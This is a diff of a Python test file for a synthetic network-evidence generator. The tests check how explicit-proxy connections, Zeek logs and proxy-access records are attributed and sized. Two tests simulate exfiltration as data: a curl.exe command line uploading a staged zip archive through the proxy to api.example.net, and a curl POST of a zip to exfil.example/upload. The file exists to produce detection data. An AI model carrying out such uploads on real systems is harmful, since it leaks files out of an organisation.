@@ -4,6 +4,7 @@
 """Explicit proxy generation and visibility tests."""
 
 import random
+from dataclasses import replace
 from datetime import UTC, datetime, timedelta
 from unittest.mock import Mock
 
@@ -19,12 +20,30 @@ from evidenceforge.events.contexts import (
     ProxyContext,
 )
 from evidenceforge.events.dispatcher import EventDispatcher
+from evidenceforge.events.lifecycle import SessionEndPlan
+from evidenceforge.events.proxy import ProxyTransactionPlan
+from evidenceforge.generation.actions.network_connection import (
+    NetworkConnectionActionBundle,
+    NetworkConnectionIdentityCapture,
+    NetworkConnectionRequest,
+)
+from evidenceforge.generation.actions.proxy_transaction import (
+    ExplicitProxyOpenPreparation,
+    ExplicitProxyRequestPreparation,
+)
 from evidenceforge.generation.activity import ActivityGenerator
 from evidenceforge.generation.activity.dns_registry import resolve_domain_ip
 from evidenceforge.generation.activity.http_multipart import build_http_multipart_context
 from evidenceforge.generation.network_identities import ScenarioNetworkResolver
 from evidenceforge.generation.network_visibility import NetworkVisibilityEngine
+from evidenceforge.generation.proxy_channels import (
+    ExplicitProxyAdmissionReceipt,
+    ExplicitProxyChannelAffinity,
+    ExplicitProxyChannelManager,
+    ExplicitProxyTunnelOpen,
+)
 from evidenceforge.generation.state_manager import StateManager
+from evidenceforge.models.exceptions import StateError
 from evidenceforge.models.http import HttpMultipartEntitySpec
 from evidenceforge.models.scenario import (
     NetworkConfig,
@@ -252,6 +271,92 @@ def test_explicit_multipart_curl_remains_authoritative_proxy_socket_owner() -> N
     )
 
     assert image == "/usr/bin/curl"
+
+
+def test_explicit_multipart_curl_owns_nested_proxy_connect_transport() -> None:
+    """A proxy child transport must not replace its bundle-owned curl process."""
+    generator, emitters = _generator(
+        [
+            NetworkSensor(
+                type="network",
+                name="both-sides",
+                monitoring_segments=["workstations", "dmz"],
+                direction="bidirectional",
+                log_formats=["zeek"],
+            )
+        ]
+    )
+    user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
+    source = generator._ip_to_system["10.0.1.10"]
+    start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+    archive = r"C:\ProgramData\Microsoft\cache_7f3a.zip"
+    command = (
+        r"C:\Windows\System32\curl.exe --proxy http://10.0.3.10:8080 "
+        rf'-F "archive=@{archive};type=application/zip" '
+        "https://api.example.net/upload/telemetry/7f3a2b19"
+    )
+    pid = generator.state_manager.create_process(
+        system=source.hostname,
+        parent_pid=explorer_pid,
+        image=r"C:\Windows\System32\curl.exe",
+        command_line=command,
+        username=user.username,
+        integrity_level="Medium",
+        logon_id=generator.state_manager.get_process(source.hostname, explorer_pid).logon_id,
+    )
+    multipart = build_http_multipart_context(
+        HttpMultipartEntitySpec.model_validate(
+            {
+                "media_type": "multipart/form-data",
+                "parts": [
+                    {
+                        "name": "archive",
+                        "body_len": 4096,
+                        "local_source_path": archive,
+                        "filename": "cache_7f3a.zip",
+                        "content_type": "application/zip",
+                    }
+                ],
+            }
+        ),
+        stable_key="nested-explicit-owner",
+    )
+
+    generator.generate_connection(
+        src_ip=source.ip,
+        dst_ip="45.33.32.30",
+        time=start + timedelta(seconds=2),
+        dst_port=443,
+        service="ssl",
+        duration=4.0,
+        source_system=source,
+        pid=pid,
+        process_image=r"C:\Windows\System32\curl.exe",
+        hostname="api.example.net",
+        preserve_dst_ip=True,
+        http=HttpContext(
+            method="POST",
+            host="api.example.net",
+            uri="/upload/telemetry/7f3a2b19",
+            user_agent="curl/8.4.0",
+            request_body_len=multipart.body_len,
+            response_body_len=2048,
+            request_multipart=multipart,
+        ),
+    )
+
+    client_flows = [
+        call.args[0]
+        for call in emitters["zeek_conn"].emit.call_args_list
+        if call.args[0].network.src_ip == source.ip and call.args[0].network.dst_ip == "10.0.3.10"
+    ]
+    assert client_flows
+    assert all(event.network.initiating_pid == pid for event in client_flows)
+    assert all(event.process is not None for event in client_flows)
+    assert all(event.process.pid == pid for event in client_flows if event.process is not None)
+    assert all(
+        event.process.command_line == command for event in client_flows if event.process is not None
+    )
 
 
 def test_activity_generator_collapses_generated_browser_family_user_agents():
@@ -809,7 +914,12 @@ def _emitters() -> dict[str, Mock]:
     return emitters
 
 
-def _generator(sensors: list[NetworkSensor]) -> tuple[ActivityGenerator, dict[str, Mock]]:
+def _generator(
+    sensors: list[NetworkSensor],
+    *,
+    generation_window_start: datetime | None = None,
+    generation_window_end: datetime | None = None,
+) -> tuple[ActivityGenerator, dict[str, Mock]]:
     workstation = _system("WKS-01", "10.0.1.10", assigned_user="alex.morgan")
     proxy = _system("PROXY-01", "10.0.3.10", ["forward_proxy"])
     systems = [workstation, proxy]
@@ -840,6 +950,8 @@ def _generator(sensors: list[NetworkSensor]) -> tuple[ActivityGenerator, dict[st
         emitters,
         network_visibility=visibility,
         dispatcher=dispatcher,
+        generation_window_start=generation_window_start,
+        generation_window_end=generation_window_end,
     )
     generator._ip_to_system = {system.ip: system for system in systems}
     generator._proxy_routes = {workstation.ip: [proxy]}
@@ -1144,6 +1256,134 @@ class TestExplicitProxyVisibility:
         )
         assert client_event.process is not None
         assert client_event.process.start_time < client_event.timestamp
+
+    def test_browser_proxy_rejects_caller_after_authoritative_session_end(self):
+        generator, _emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="client-tap",
+                    monitoring_segments=["workstations"],
+                    direction="outbound",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        _user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
+        workstation = generator._ip_to_system["10.0.1.10"]
+        explorer = generator.state_manager.get_process(workstation.hostname, explorer_pid)
+        assert explorer is not None
+        request_time = datetime(2024, 1, 15, 10, 6, 0, tzinfo=UTC)
+        generator.state_manager.plan_session_end(
+            explorer.logon_id,
+            SessionEndPlan(
+                canonical_end=request_time - timedelta(minutes=1),
+                authority="explicit_storyline",
+                storyline_event_id="evt-browser-logoff",
+            ),
+        )
+        proxy = generator._ip_to_system["10.0.3.10"]
+
+        caller_image = generator._caller_explicit_proxy_process_image(
+            source_system=workstation,
+            pid=explorer_pid,
+            process_image=explorer.image,
+            time=request_time,
+            proxy_context=ProxyContext(
+                client_ip=workstation.ip,
+                method="GET",
+                url="https://example.com/",
+                host="example.com",
+                status_code=200,
+                user_agent="Mozilla/5.0 Firefox/121.0",
+                proxy_fqdn="PROXY-01.example.org",
+            ),
+            proxy_sys=proxy,
+            dst_port=443,
+            http=HttpContext(
+                method="GET",
+                host="example.com",
+                uri="/",
+                user_agent="Mozilla/5.0 Firefox/121.0",
+            ),
+        )
+
+        assert caller_image is None
+
+    def test_proxy_drops_actor_when_source_visibility_would_cross_session_end(self):
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="client-tap",
+                    monitoring_segments=["workstations"],
+                    direction="outbound",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
+        workstation = generator._ip_to_system["10.0.1.10"]
+        explorer = generator.state_manager.get_process(workstation.hostname, explorer_pid)
+        assert explorer is not None
+        browser_image = r"C:\Program Files\Mozilla Firefox\firefox.exe"
+        browser_pid = generator.state_manager.create_process(
+            system=workstation.hostname,
+            parent_pid=explorer_pid,
+            image=browser_image,
+            command_line=f'"{browser_image}" -osint -url https://example.com/',
+            username=user.username,
+            integrity_level="Medium",
+            logon_id=explorer.logon_id,
+        )
+        request_time = datetime(2024, 1, 15, 10, 4, 0, tzinfo=UTC)
+        session_end = request_time + timedelta(minutes=1)
+        generator.state_manager.plan_session_end(
+            explorer.logon_id,
+            SessionEndPlan(
+                canonical_end=session_end,
+                authority="explicit_storyline",
+                storyline_event_id="evt-browser-logoff",
+            ),
+        )
+        generator._clamp_after_visible_process_create = Mock(
+            return_value=session_end + timedelta(seconds=5)
+        )
+
+        generator.generate_connection(
+            src_ip=workstation.ip,
+            dst_ip="93.184.216.34",
+            time=request_time,
+            dst_port=443,
+            proto="tcp",
+            service="ssl",
+            duration=1.0,
+            orig_bytes=500,
+            resp_bytes=5000,
+            pid=browser_pid,
+            source_system=workstation,
+            hostname="example.com",
+            conn_state="SF",
+            process_image=browser_image,
+            http=HttpContext(
+                method="GET",
+                host="example.com",
+                uri="/",
+                user_agent="Mozilla/5.0 Firefox/121.0",
+                response_body_len=4000,
+                status_code=200,
+                status_msg="OK",
+            ),
+        )
+
+        client_event = next(
+            call.args[0]
+            for call in emitters["zeek_conn"].emit.call_args_list
+            if call.args[0].network.src_ip == workstation.ip
+            and call.args[0].network.dst_ip == "10.0.3.10"
+        )
+        assert client_event.process is None
+        assert client_event.network.initiating_pid == -1
 
     def test_proxy_upstream_follows_planned_request_when_client_process_is_source_delayed(
         self,
@@ -2985,10 +3225,13 @@ class TestExplicitProxyVisibility:
         assert ("10.0.3.10", hashed_ip, 443) not in pairs
 
         dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
-        raw_ip_dns_events = [event for event in dns_events if event.dns.query == raw_ip]
-        assert raw_ip_dns_events
-        assert any(event.dns.answers == [raw_ip] for event in raw_ip_dns_events)
-        assert all(hashed_ip not in event.dns.answers for event in raw_ip_dns_events)
+        raw_ip_address_queries = [
+            event
+            for event in dns_events
+            if event.dns.query == raw_ip and event.dns.qtype in {1, 28}
+        ]
+        assert not raw_ip_address_queries
+        assert all(hashed_ip not in event.dns.answers for event in dns_events)
 
         proxy_event = emitters["proxy_access"].emit.call_args.args[0]
         assert proxy_event.protocol.proxy.host == raw_ip
@@ -3559,6 +3802,76 @@ class TestExplicitProxyVisibility:
         )
         assert client_event.network.orig_bytes < request_bytes * 2
 
+    def test_inspected_https_upload_replaces_stale_planned_payload_with_http_body(self):
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        planned_payload = 44_025_120
+        request_body = 18_782_613
+        proxy_overhead = 290
+        generator._build_proxy_context = Mock(
+            return_value=ProxyContext(
+                client_ip="10.0.1.10",
+                method="POST",
+                url="https://exfil.example/upload",
+                host="exfil.example",
+                status_code=200,
+                sc_bytes=2300,
+                cs_bytes=planned_payload + proxy_overhead,
+                time_taken=1200,
+                user_agent="curl/8.4.0",
+                content_type="application/zip",
+                cache_result="MISS",
+                referrer="-",
+                proxy_fqdn="PROXY-01.example.org",
+            )
+        )
+
+        generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="93.184.216.34",
+            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
+            dst_port=443,
+            proto="tcp",
+            service="ssl",
+            duration=12.0,
+            orig_bytes=planned_payload,
+            resp_bytes=2048,
+            source_system=generator._ip_to_system["10.0.1.10"],
+            hostname="exfil.example",
+            conn_state="SF",
+            http=HttpContext(
+                method="POST",
+                host="exfil.example",
+                uri="/upload",
+                version="1.1",
+                user_agent="curl/8.4.0",
+                request_body_len=request_body,
+                response_body_len=2048,
+                status_code=200,
+                status_msg="OK",
+                resp_mime_types=["application/json"],
+            ),
+        )
+
+        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
+        client_event = next(
+            call.args[0]
+            for call in emitters["zeek_conn"].emit.call_args_list
+            if call.args[0].network.src_ip == "10.0.1.10"
+            and call.args[0].network.dst_ip == "10.0.3.10"
+        )
+        assert proxy_event.protocol.proxy.cs_bytes == request_body + proxy_overhead
+        assert client_event.network.orig_bytes < request_body + 10_000
+
     def test_allowed_proxy_miss_origin_leg_is_established_when_state_is_implicit(self):
         generator, emitters = _generator(
             [
@@ -3627,9 +3940,178 @@ class TestExplicitProxyVisibility:
         assert egress_events[0].protocol.ssl is not None
         assert egress_events[0].protocol.ssl.established is True
 
-    def test_https_subresources_reuse_active_connect_tunnel(self):
+    def test_proxy_open_preparation_rejects_direct_http_owner_before_any_preparation(self):
+        """A malformed dual-manager request is State/RNG/runtime/timing/output neutral."""
+
+        from evidenceforge.generation.activity.helpers import _get_rng
+
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        client_capture = NetworkConnectionIdentityCapture()
+        generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="10.0.3.10",
+            time=start,
+            dst_port=8080,
+            proto="tcp",
+            service="http",
+            duration=2.0,
+            orig_bytes=400,
+            resp_bytes=800,
+            source_system=generator._ip_to_system["10.0.1.10"],
+            proxy_bypass=True,
+            suppress_direct_http_channel=True,
+            identity_capture=client_capture,
+        )
+        client_root = client_capture.require_prepared_root()
+        client_receipt = client_capture.require_receipt()
+        client = client_root.result.transaction
+        assert client.closed_at is not None
+        phase = ProxyTransactionPlan(
+            stable_id="dual-manager-rejection",
+            terminal_outcome="success",
+            resolver_mode=None,
+            client_connect_at=client.started_at,
+            tunnel_request_at=client.started_at + timedelta(milliseconds=10),
+            request_at=client.started_at + timedelta(milliseconds=20),
+            decision_at=client.started_at + timedelta(milliseconds=30),
+            dns_query_at=None,
+            dns_response_at=None,
+            origin_connect_at=None,
+            tls_complete_at=None,
+            origin_request_at=None,
+            origin_response_at=None,
+            origin_close_at=None,
+            client_flush_at=client.started_at + timedelta(milliseconds=40),
+            close_at=client.started_at + timedelta(milliseconds=50),
+            origin_conn_state=None,
+        )
+        proxy_context = ProxyContext(
+            client_ip="10.0.1.10",
+            method="GET",
+            url="https://example.com/",
+            host="example.com",
+            status_code=200,
+            cs_bytes=200,
+            sc_bytes=1200,
+            user_agent="Mozilla/5.0",
+            cache_result="MISS",
+            proxy_fqdn="PROXY-01.example.org",
+            transaction=phase,
+        )
+        preparation = ExplicitProxyOpenPreparation(
+            affinity=ExplicitProxyChannelAffinity(
+                client_ip="10.0.1.10",
+                proxy_ip="10.0.3.10",
+                proxy_port=8080,
+                origin_host="example.com",
+                origin_ip="93.184.216.34",
+                origin_port=443,
+                user_agent="Mozilla/5.0",
+                auth_identity="",
+                policy_id="default",
+            ),
+            client_root=client_root,
+            client_receipt=client_receipt,
+            phase_plan=phase,
+            proxy_context=proxy_context,
+            tunnel_group_id="dual-manager-rejection",
+            planned_request_count=1,
+        )
+        assert generator._lifecycle_authority.authenticates_prepared_network_receipt(
+            client_root,
+            client_receipt,
+        )
+        state_before = generator.state_manager.materialization_digest()
+        rng_before = _get_rng().getstate()
+        runtime_before = generator._network_transaction_runtime.census()
+        timing_before = generator.timing_runtime.audit.snapshot()
+        source_timing_before = generator._source_timing_planner.census()
+        proxy_before = generator._proxy_channel_manager.census()
+        http_before = generator._http_channel_manager.census()
+        common_before = generator._application_channel_registry.census()
+        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}
+
+        with pytest.raises(ValueError, match="must suppress the direct HTTP channel"):
+            NetworkConnectionActionBundle(
+                generator,
+                NetworkConnectionRequest(
+                    src_ip="10.0.3.10",
+                    dst_ip="93.184.216.34",
+                    time=start + timedelta(milliseconds=100),
+                    dst_port=443,
+                    proto="tcp",
+                    service="ssl",
+                    duration=1.0,
+                    orig_bytes=200,
+                    resp_bytes=1200,
+                    source_system=generator._ip_to_system["10.0.3.10"],
+                    http=HttpContext(
+                        method="GET",
+                        host="example.com",
+                        uri="/",
+                        user_agent="Mozilla/5.0",
+                        response_body_len=1200,
+                    ),
+                    proxy_bypass=True,
+                    explicit_proxy_open_preparation=preparation,
+                ),
+            ).execute()
+
+        assert generator.state_manager.materialization_digest() == state_before
+        assert _get_rng().getstate() == rng_before
+        assert generator._network_transaction_runtime.census() == runtime_before
+        assert generator.timing_runtime.audit.snapshot() == timing_before
+        assert generator._source_timing_planner.census() == source_timing_before
+        assert generator._proxy_channel_manager.census() == proxy_before
+        assert generator._http_channel_manager.census() == http_before
+        assert generator._application_channel_registry.census() == common_before
+        assert {
+            name: emitter.emit.call_count for name, emitter in emitters.items()
+        } == output_before
+
+    def test_https_subresources_reuse_preplanned_payload_capacity(self, monkeypatch):
         from evidenceforge.generation.activity.dns_registry import resolve_domain_ip
 
+        lifecycle_modes: list[str] = []
+        original_publish = NetworkConnectionIdentityCapture._publish_committed_claimed
+
+        def record_lifecycle_mode(
+            capture,
+            claim,
+            *,
+            root,
+            receipt,
+            application_receipt=None,
+            persistent_smb_root_handoff=None,
+            outcome,
+        ):
+            lifecycle_modes.append(root.runtime_token.lifecycle_mode)
+            original_publish(
+                capture,
+                claim,
+                root=root,
+                receipt=receipt,
+                application_receipt=application_receipt,
+                persistent_smb_root_handoff=persistent_smb_root_handoff,
+                outcome=outcome,
+            )
+
+        monkeypatch.setattr(
+            NetworkConnectionIdentityCapture,
+            "_publish_committed_claimed",
+            record_lifecycle_mode,
+        )
         generator, emitters = _generator(
             [
                 NetworkSensor(
@@ -3650,9 +4132,9 @@ class TestExplicitProxyVisibility:
             dst_port=443,
             proto="tcp",
             service="ssl",
-            duration=1.0,
-            orig_bytes=500,
-            resp_bytes=5000,
+            duration=30.0,
+            orig_bytes=1500,
+            resp_bytes=8000,
             source_system=generator._ip_to_system["10.0.1.10"],
             hostname="example.com",
             emit_dns=True,
@@ -3664,6 +4146,9 @@ class TestExplicitProxyVisibility:
                 version="1.1",
                 user_agent="Mozilla/5.0",
                 response_body_len=5000,
+                flow_request_body_len=200,
+                flow_response_body_len=6200,
+                flow_transaction_count=2,
                 status_code=200,
                 status_msg="OK",
             ),
@@ -3671,6 +4156,13 @@ class TestExplicitProxyVisibility:
         pairs_after_first = list(_conn_pairs(emitters))
         proxy_calls_after_first = emitters["proxy_access"].emit.call_count
         ssl_calls_after_first = emitters["zeek_ssl"].emit.call_count
+        first_census = generator._proxy_channel_manager.census()
+        assert first_census.open_tunnel_views == 1
+        assert first_census.application.open_channels == 1
+        assert first_census.application.used_operation_ids == 1
+        assert generator._application_channel_registry.census().open_channels == 1
+        assert generator._http_channel_manager.census().open_transport_views == 0
+        assert lifecycle_modes == ["network", "network"]
         reused_uid = generator.generate_connection(
             src_ip="10.0.1.10",
             dst_ip="93.184.216.34",
@@ -3692,6 +4184,7 @@ class TestExplicitProxyVisibility:
                 version="1.1",
                 user_agent="Mozilla/5.0",
                 response_body_len=1200,
+                trans_depth=2,
                 status_code=200,
                 status_msg="OK",
             ),
@@ -3705,11 +4198,257 @@ class TestExplicitProxyVisibility:
         assert emitters["proxy_access"].emit.call_count == proxy_calls_after_first + 1
         reused_proxy_event = emitters["proxy_access"].emit.call_args.args[0]
         assert reused_proxy_event.network.application_layer_only is True
-        assert reused_proxy_event.network.zeek_uid == first_uid
+        assert reused_proxy_event.network.zeek_uid == reused_uid
         assert reused_proxy_event.protocol.proxy.url == "https://example.com/app.js"
         assert emitters["zeek_ssl"].emit.call_count == ssl_calls_after_first
+        reused_census = generator._proxy_channel_manager.census()
+        assert reused_census.open_tunnel_views == 1
+        assert reused_census.application.open_channels == 1
+        assert reused_census.application.used_operation_ids == 2
+        assert generator._application_channel_registry.census().open_channels == 1
+        assert generator._http_channel_manager.census().open_transport_views == 0
+        assert lifecycle_modes == ["network", "network", "application_child"]
 
-    def test_tight_successful_https_requests_each_emit_proxy_request_on_reused_tunnel(self):
+    def test_late_inspected_requests_preflight_to_request_local_setup_only(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """A late three-request flow uses exact request-local authenticated transports."""
+
+        publications: list[NetworkConnectionIdentityCapture] = []
+        original_publish = NetworkConnectionIdentityCapture._publish_committed_claimed
+
+        def record_publication(
+            capture: NetworkConnectionIdentityCapture,
+            claim: object,
+            *,
+            root: object,
+            receipt: object,
+            application_receipt: object | None = None,
+            persistent_smb_root_handoff: object | None = None,
+            outcome: object,
+        ) -> None:
+            original_publish(
+                capture,
+                claim,
+                root=root,
+                receipt=receipt,
+                application_receipt=application_receipt,
+                persistent_smb_root_handoff=persistent_smb_root_handoff,
+                outcome=outcome,
+            )
+            publications.append(capture)
+
+        monkeypatch.setattr(
+            NetworkConnectionIdentityCapture,
+            "_publish_committed_claimed",
+            record_publication,
+        )
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="both-sides",
+                    monitoring_segments=["workstations", "dmz"],
+                    direction="bidirectional",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        prepare_calls: list[dict[str, object]] = []
+        prepare_affinities: list[object] = []
+        original_prepare = generator._proxy_channel_manager.prepare_open_tunnel
+
+        def record_prepare(*args: object, **kwargs: object) -> object:
+            assert len(args) == 1
+            prepare_affinities.append(args[0])
+            prepare_calls.append(dict(kwargs))
+            return original_prepare(*args, **kwargs)
+
+        monkeypatch.setattr(
+            generator._proxy_channel_manager,
+            "prepare_open_tunnel",
+            record_prepare,
+        )
+        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        request_specs = (
+            (start_time, "/", 1.0, 240, 1800, 1200, 1),
+            (start_time + timedelta(seconds=2), "/app.js", 0.3, 180, 900, 700, 2),
+            (start_time + timedelta(seconds=4), "/favicon.ico", 0.2, 160, 700, 500, 3),
+        )
+        returned_uids = []
+        for request_time, uri, duration, orig_bytes, resp_bytes, body_bytes, depth in request_specs:
+            returned_uids.append(
+                generator.generate_connection(
+                    src_ip="10.0.1.10",
+                    dst_ip="93.184.216.34",
+                    time=request_time,
+                    dst_port=443,
+                    proto="tcp",
+                    service="ssl",
+                    duration=duration,
+                    orig_bytes=orig_bytes,
+                    resp_bytes=resp_bytes,
+                    source_system=generator._ip_to_system["10.0.1.10"],
+                    hostname="example.com",
+                    conn_state="SF",
+                    http=HttpContext(
+                        method="GET",
+                        host="example.com",
+                        uri=uri,
+                        version="1.1",
+                        user_agent="Mozilla/5.0",
+                        response_body_len=body_bytes,
+                        flow_request_body_len=480 if depth == 1 else None,
+                        flow_response_body_len=3600 if depth == 1 else None,
+                        flow_transaction_count=3 if depth == 1 else None,
+                        trans_depth=depth,
+                        status_code=200,
+                        status_msg="OK",
+                    ),
+                )
+            )
+
+        physical_events = [
+            call.args[0]
+            for call in emitters["zeek_conn"].emit.call_args_list
+            if not call.args[0].network.application_layer_only
+        ]
+        client_events = [
+            event
+            for event in physical_events
+            if event.network.src_ip == "10.0.1.10"
+            and event.network.dst_ip == "10.0.3.10"
+            and event.network.dst_port == 8080
+        ]
+        origin_events = [
+            event
+            for event in physical_events
+            if event.network.src_ip == "10.0.3.10" and event.network.dst_port == 443
+        ]
+        proxy_events = [call.args[0] for call in emitters["proxy_access"].emit.call_args_list]
+        assert len(client_events) == 3
+        assert len(origin_events) == 3
+        assert len(proxy_events) == 3
+        assert [
+            (event.network.orig_bytes, event.network.resp_bytes) for event in client_events
+        ] == [(846, 1615), (636, 932), (566, 697)]
+        assert [
+            (event.network.orig_bytes, event.network.resp_bytes) for event in origin_events
+        ] == [(768, 6219), (619, 3601), (792, 5520)]
+        assert [
+            (event.protocol.proxy.cs_bytes, event.protocol.proxy.sc_bytes) for event in proxy_events
+        ] == [(367, 1439), (316, 789), (335, 567)]
+        assert [event.protocol.proxy.url for event in proxy_events] == [
+            "https://example.com/",
+            "https://example.com/app.js",
+            "https://example.com/favicon.ico",
+        ]
+        assert len(set(returned_uids)) == 3
+        assert {event.network.zeek_uid for event in client_events} == set(returned_uids)
+        assert len({event.network.zeek_uid for event in origin_events}) == 3
+
+        clients_by_id = {
+            capture.require().stable_id: capture
+            for capture in publications
+            if capture.transaction is not None
+            and capture.transaction.src_ip == "10.0.1.10"
+            and capture.transaction.dst_ip == "10.0.3.10"
+            and capture.transaction.dst_port == 8080
+        }
+        origin_captures = [
+            capture
+            for capture in publications
+            if capture.transaction is not None
+            and capture.transaction.src_ip == "10.0.3.10"
+            and capture.transaction.dst_port == 443
+        ]
+        assert len(clients_by_id) == 3
+        assert len(origin_captures) == 3
+        proxy_events_by_group = {
+            event.protocol.proxy.transaction.stable_id: event
+            for event in proxy_events
+            if event.protocol.proxy.transaction is not None
+        }
+        reserved_request_bytes = 0
+        reserved_response_bytes = 0
+        channel_ids: set[str] = set()
+        application_receipt_tokens: set[str] = set()
+        for origin_capture in origin_captures:
+            origin = origin_capture.require()
+            application_receipt = origin_capture.require_application_receipt()
+            assert isinstance(application_receipt, ExplicitProxyAdmissionReceipt)
+            assert generator._proxy_channel_manager.authenticates_admission_receipt(
+                application_receipt
+            )
+            assert application_receipt.current_transport_id == origin.stable_id
+            assert len(application_receipt.prerequisite_transport_ids) == 1
+            client_capture = clients_by_id[application_receipt.prerequisite_transport_ids[0]]
+            client = client_capture.require()
+
+            opened = application_receipt.sidecar_result
+            assert isinstance(opened, ExplicitProxyTunnelOpen)
+            channel_ids.add(opened.tunnel.channel_id)
+            application_receipt_tokens.add(application_receipt.application_receipt_token)
+            assert opened.tunnel.planned_request_count == 0
+            assert opened.remaining_request_count == 0
+            assert opened.remaining_request_wire_bytes == 0
+            assert opened.remaining_response_wire_bytes == 0
+            common_receipt = application_receipt.application_receipt
+            assert common_receipt.kind == "open_completed_close"
+            snapshot = common_receipt.snapshot
+            proxy_event = proxy_events_by_group[opened.tunnel.tunnel_group_id]
+            phase = proxy_event.protocol.proxy.transaction
+            assert phase is not None
+            assert client.closed_at is not None
+            assert snapshot.closed_at == phase.client_flush_at
+            assert snapshot.last_activity_at == phase.client_flush_at
+            assert snapshot.close_reason == "setup-only"
+            assert snapshot.reserved_operations == 1
+            assert snapshot.completed_operations == 1
+            assert snapshot.reserved_initiator_bytes == (
+                phase.tunnel_setup_cs_bytes + proxy_event.protocol.proxy.cs_bytes
+            )
+            assert snapshot.reserved_responder_bytes == (
+                phase.tunnel_setup_sc_bytes + proxy_event.protocol.proxy.sc_bytes
+            )
+            assert client.orig_bytes == snapshot.reserved_initiator_bytes
+            assert client.resp_bytes == snapshot.reserved_responder_bytes
+            reserved_request_bytes += snapshot.reserved_initiator_bytes
+            reserved_response_bytes += snapshot.reserved_responder_bytes
+
+            origin_receipt = origin_capture.require_receipt()
+            client_receipt = client_capture.require_receipt()
+            assert origin_receipt.connection_receipt.prerequisite_proofs[0].receipt_token == (
+                client_receipt.connection_receipt.receipt_token
+            )
+
+        assert sum(event.network.orig_bytes for event in client_events) == reserved_request_bytes
+        assert sum(event.network.resp_bytes for event in client_events) == reserved_response_bytes
+        assert len(channel_ids) == 3
+        assert len(application_receipt_tokens) == 3
+        assert [call["planned_request_count"] for call in prepare_calls] == [0, 0, 0]
+        assert all(call["aggregate_request_wire_bytes"] == 0 for call in prepare_calls)
+        assert all(call["aggregate_response_wire_bytes"] == 0 for call in prepare_calls)
+        assert len(prepare_affinities) == 3
+        census = generator._proxy_channel_manager.census()
+        assert census.open_tunnel_views == 0
+        assert census.prepared_admissions == 0
+        assert census.claimed_admissions == 0
+        assert census.reserved_channel_ids == 0
+        assert census.reserved_affinities == 0
+        assert census.reserved_origin_transport_ids == 0
+        assert census.application.open_channels == 0
+        assert census.application.active_operations == 0
+        assert census.application.prepared_admissions == 0
+        assert census.application.claimed_admissions == 0
+        assert census.application.reserved_channel_ids == 0
+        assert census.application.reserved_transport_ids == 0
+        assert census.application.reserved_operation_ids == 0
+
+    def test_proxy_manager_owns_one_parent_transport_and_three_browser_children(self):
+        """One BrowserSession aggregate must not duplicate tunnel setup or physical legs."""
+
         generator, emitters = _generator(
             [
                 NetworkSensor(
@@ -3722,8 +4461,702 @@ class TestExplicitProxyVisibility:
             ]
         )
         start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
-        first_uid = ""
-        pairs_after_first: list[tuple[str, str, int]] = []
+        request_specs = (
+            (start_time, "/", 1, 3, 5000, 800),
+            (start_time + timedelta(seconds=8), "/app.js", 2, 1, 2200, 140),
+            (start_time + timedelta(seconds=16), "/theme.css", 3, 1, 1800, 120),
+        )
+        uids: list[str] = []
+        for request_time, uri, depth, flow_count, response_bytes, request_bytes in request_specs:
+            uids.append(
+                generator.generate_connection(
+                    src_ip="10.0.1.10",
+                    dst_ip="93.184.216.34",
+                    time=request_time,
+                    dst_port=443,
+                    proto="tcp",
+                    service="ssl",
+                    duration=45.0 if depth == 1 else 0.2,
+                    orig_bytes=request_bytes,
+                    resp_bytes=response_bytes,
+                    source_system=generator._ip_to_system["10.0.1.10"],
+                    hostname="example.com",
+                    emit_dns=True,
+                    conn_state="SF",
+                    http=HttpContext(
+                        method="POST" if depth == 1 else "GET",
+                        host="example.com",
+                        uri=uri,
+                        version="1.1",
+                        user_agent="Mozilla/5.0",
+                        request_body_len=600 if depth == 1 else 0,
+                        response_body_len=response_bytes,
+                        flow_request_body_len=940 if depth == 1 else None,
+                        flow_response_body_len=9000 if depth == 1 else None,
+                        flow_transaction_count=flow_count,
+                        trans_depth=depth,
+                        status_code=200,
+                        status_msg="OK",
+                    ),
+                )
+            )
+
+        assert len(set(uids)) == 1
+        physical_events = [
+            call.args[0]
+            for call in emitters["zeek_conn"].emit.call_args_list
+            if not call.args[0].network.application_layer_only
+        ]
+        client_events = [
+            event
+            for event in physical_events
+            if event.network.src_ip == "10.0.1.10" and event.network.dst_ip == "10.0.3.10"
+        ]
+        origin_events = [
+            event
+            for event in physical_events
+            if event.network.src_ip == "10.0.3.10"
+            and event.network.protocol == "tcp"
+            and event.network.dst_port == 443
+        ]
+        proxy_events = [call.args[0] for call in emitters["proxy_access"].emit.call_args_list]
+        assert len(client_events) == 1
+        assert len(origin_events) == 1
+        assert len(proxy_events) == 3
+        assert [event.network.application_layer_only for event in proxy_events] == [
+            False,
+            True,
+            True,
+        ]
+        assert {event.network.zeek_uid for event in proxy_events} == {uids[0]}
+        assert {event.network.src_port for event in proxy_events} == {
+            client_events[0].network.src_port
+        }
